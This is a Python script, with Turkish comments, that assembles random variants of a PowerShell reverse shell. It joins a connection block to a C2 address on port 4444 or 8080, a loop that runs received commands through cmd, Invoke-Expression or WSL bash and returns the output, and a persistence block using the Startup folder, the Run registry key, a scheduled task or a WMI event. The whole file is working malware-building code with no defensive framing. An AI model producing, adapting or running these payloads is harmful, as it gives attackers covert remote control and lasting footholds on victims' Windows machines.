import random


# 1. grup değişkenler
a1 = '''
# DNS üzerinden C2 adresi öğren
$domain = "example.com"
$ip = ([System.Net.Dns]::GetHostAddresses($domain))[0].IPAddressToString
$port = 4444

# Bağlantıyı başlat (CMD üzerinden komut alacak şekilde)
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}'''
a2 = '''$ip = "192.168.1.100"  # Hedef IP adresi
$port = 4444            # Hedef port

# Bağlantıyı başlat (TCP bağlantısı)
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}

# FTP Sunucu Bilgileri
$ftpServer = "ftp://$ip"
$ftpPort = 21            # FTP portu

# FTP Bağlantısı
$ftpUrl = "$ftpServer:$ftpPort/"
$ftpRequest = [System.Net.FtpWebRequest]::Create($ftpUrl)
$ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectory
$ftpRequest.Credentials = New-Object System.Net.NetworkCredential("anonymous", "")

# FTP Sunucusuna Bağlantı
$ftpResponse = $ftpRequest.GetResponse()
$ftpStream = $ftpResponse.GetResponseStream()'''
a3 = '''$ip = "192.168.1.100"  # Hedef IP adresi
$port = 4444            # Hedef port

# MySQL Sunucu Bilgileri
$mysqlServer = "192.168.1.100"
$mysqlPort = 3306       # MySQL portu
$mysqlUser = "root"     # MySQL kullanıcı adı
$mysqlPassword = "password"  # MySQL parolası
$mysqlDatabase = "shell_db"  # Kullanılacak veritabanı

# MySQL Bağlantısı
$connectionString = "Server=$mysqlServer;Port=$mysqlPort;Database=$mysqlDatabase;User Id=$mysqlUser;Password=$mysqlPassword;"
$connection = New-Object MySql.Data.MySqlClient.MySqlConnection($connectionString)
$connection.Open()

# Bağlantıyı başlat (TCP bağlantısı)
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}'''
a4 = '''$ip = "192.168.1.100"  # Hedef IP adresi
$port = 8080            # Hedef port

# Bağlantıyı başlat (TCP bağlantısı)
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}

# HTTP Sunucusuna Bağlantı
$httpUrl = "http://$ip:$port/command"
$httpRequest = [System.Net.HttpWebRequest]::Create($httpUrl)
$httpRequest.Method = "POST"
$httpRequest.ContentType = "application/x-www-form-urlencoded"'''


# 2. grup değişkenler
b1 = '''
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (cmd /c $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'CMD> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()'''
    
b2 = '''while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    # Gelen veriyi al
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    
    # Gelen komutu çalıştır
    $sendback = Invoke-Expression $data 2>&1 | Out-String
    
    # Çıktıyı byte dizisine dönüştür
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
    
    # Sonucu geri gönder
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()  # Stream'i temizle'''
b3 = '''while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    # Gelen veriyi al
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    
    # Gelen komutu Linux Bash ile çalıştır
    $sendback = wsl bash -c "$data" 2>&1 | Out-String
    
    # Çıktıyı byte dizisine dönüştür
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
    
    # Sonucu geri gönder
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()  # Stream'i temizle'''
b4 = '''
# Komutları al ve çalıştır
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    # Gelen veriyi al
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    
    # Gelen komutu PowerShell ile çalıştır
    $sendback = Invoke-Expression $data 2>&1 | Out-String
    
    # Çıktıyı byte dizisine dönüştür
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
    
    # Sonucu geri gönder
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()  # Stream'i temizle'''

# 3. grup değişkenler
c1 = '''$path = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\persistence.ps1')
$script = "C:\path\to\your\script.ps1"
Copy-Item $script -Destination $path
'''
c2 = '''$key = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$value = "MyScript"
$scriptPath = "C:\path\to\your\script.ps1"
Set-ItemProperty -Path $key -Name $value -Value $scriptPath
'''
c3 = '''$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\path\to\your\script.ps1"
$taskTrigger = New-ScheduledTaskTrigger -AtLogon
$task = New-ScheduledTask -Action $taskAction -Trigger $taskTrigger
Register-ScheduledTask -TaskName "MyPersistenceTask" -InputObject $task
'''
c4 = '''$wmiQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_ComputerSystem'"
$action = "powershell.exe -ExecutionPolicy Bypass -File C:\path\to\your\script.ps1"
Register-WmiEvent -Query $wmiQuery -Action {Start-Process -FilePath "powershell.exe" -ArgumentList $action}
'''


print(random.choice([a1, a2, a3, a4]) + "\n")
print(random.choice([b1, b2, b3, b4,]) + "\n")
print(random.choice([c1, c2, c3, c4]) + "\n")

